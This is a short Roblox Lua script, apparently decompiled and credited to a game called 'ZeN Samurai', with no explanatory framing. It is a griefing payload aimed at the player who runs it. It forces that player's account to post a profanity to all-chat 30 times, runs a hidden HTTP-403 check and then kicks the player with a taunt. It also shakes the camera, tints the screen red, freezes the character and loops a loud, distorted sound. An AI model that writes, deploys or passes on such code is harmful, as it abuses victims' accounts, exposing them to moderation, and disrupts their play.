-- taken from "ZeN Samurai" by Trb......


spawn(function()
  for i = 1, 30 do
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("sh~ it","All")
  game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yes","All")
  end
end)


local function check_upvr() -- Line 1, Named "check"
	spawn(function() -- Line 2
		local _, pcall_result2 = pcall(function() -- Line 3
			game.MarketplaceService:PlayerOwnsAsset(game.Players.LocalPlayer, 1818)
		end)
		if pcall_result2 and pcall_result2:find("HTTP 403") then
			_G.ret = true
			return true
		end
		_G.ret = false
		return false
	end)
	repeat
		wait()
	until _G.ret ~= nil
	return _G.ret
end
spawn(function() -- Line 17
	--[[ Upvalues[1]:
		[1]: check_upvr (readonly)
	]]
	repeat
		wait()
	until game.NetworkClient:FindFirstChild("ClientReplicator") == nil
	wait(0.1)
	if check_upvr() == false then
		game.Players.LocalPlayer:Kick("[ERROR] An error has occured")
	end
end)
repeat
	wait()
until check_upvr() == true
game.Players.LocalPlayer:Kick("[4LT]: 🤣 | check your home page")
spawn(function() -- Line 26
	while wait() do
		workspace.CurrentCamera.CFrame = CFrame.new() * CFrame.Angles(math.rad(math.random(-2, 2)), math.rad(math.random(-15, 15)), 0)
	end
end)
local c = Instance.new("ColorCorrectionEffect", game.Lighting) c.TintColor = Color3.new(1,0,0)

game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
local s = Instance.new("Sound",game.Workspace) 
 
s.SoundId = "rbxassetid://2834286918"
s.Volume = 3
s.Looped = true 
 
 
local b = Instance.new("DistortionSoundEffect",s)
b.Level = 2

s:Play()


